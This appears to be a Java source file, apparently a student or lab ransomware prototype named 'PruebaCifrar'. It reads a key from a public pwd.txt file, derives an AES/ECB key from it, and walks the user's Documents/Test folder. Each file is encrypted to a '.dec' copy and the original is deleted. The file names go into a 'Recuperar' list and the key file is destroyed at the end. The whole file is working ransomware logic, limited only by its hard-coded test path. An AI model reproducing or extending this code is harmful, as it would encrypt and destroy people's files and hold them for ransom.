/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package pruebacifrar;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.SecretKeySpec;

/**
 *
 * @author ifons
 */
public class PruebaCifrar {
    static String llave;
    static byte[] key;
    static SecretKey secretKey;
    static Cipher cipher;
    static File pwd=null;

    
    private static void recorre(File dir,FileWriter ext){
        if (dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; children != null && i < children.length; i++) {
                recorre(new File(dir, children[i]),ext);
            }
        }
        if (dir.isFile()) {
            try{
            
                FileInputStream archivo = new FileInputStream(dir);
                String[] nombre = dir.getName().split("\\.");
                FileOutputStream archivo2= new FileOutputStream(dir.getParent() + "/" + nombre[0] + ".dec");
                byte[] input = new byte[64];
                int bytesRead;

                try {
                    while ((bytesRead = archivo.read(input)) != -1) {
                        byte[] output = cipher.update(input, 0, bytesRead);
    
                        if (output != null)
                            archivo2.write(output);
                        
                    }
                    
                    byte[] output;
                    try {
                        output = cipher.doFinal();
                        if (output != null)
                            archivo2.write(output);
                    } catch(Exception ex) {
                        
                    } 
                    
                    ext.write("\n" + nombre[0]);
                    ext.write("\n" + nombre[1]);
                    
                    archivo.close();
                    archivo2.flush();
                    archivo2.close();
                    
                    dir.delete();
                } catch (Exception ex) {
                    
                }
            }catch (FileNotFoundException ex){
                
            }
            //System.out.println(dir.getAbsolutePath());
        }
    }
    
    public static void setKey(String myKey) 
    {
        MessageDigest sha = null;
        try {
            key = myKey.getBytes("UTF-8");
            sha = MessageDigest.getInstance("SHA-1");
            key = sha.digest(key);
            key = Arrays.copyOf(key, 16); 
            secretKey = new SecretKeySpec(key, "AES");
        } 
        catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } 
        catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
    
    public static void findFile(String name,File file)
    {
        File[] list = file.listFiles();
        if(list!=null)
        for (File fil : list)
        {
            if (fil.isDirectory())
            {
                if(name.equalsIgnoreCase(fil.getName())){
                    pwd=new File(fil.getAbsolutePath() + "/pwd.txt");
                }
            }
        }
    }
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        String user= System.getProperty("user.name");
        File dir = new File("C:/Users/" + user + "/Documents/Test");
        
        try{
            pwd=new File("C:/Users/Public/PruebaCifrar/pwd.txt");
            Scanner lec= new Scanner(pwd);
            llave=lec.nextLine();
            //System.out.println(llave);
            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            setKey(llave);


            cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            File n= new File("C:/Users/" + user + "/Documents/Test/Recuperar");
            if(!n.exists()){
                n.mkdir();
            }
           
            FileWriter ext = new FileWriter(n.getAbsolutePath() + "/archivos.txt");
            ext.write("correo");
            recorre(dir,ext);
            ext.close();
            lec.close();
            pwd.delete();

        } catch(Exception ex){
                
        }
    }
    
}
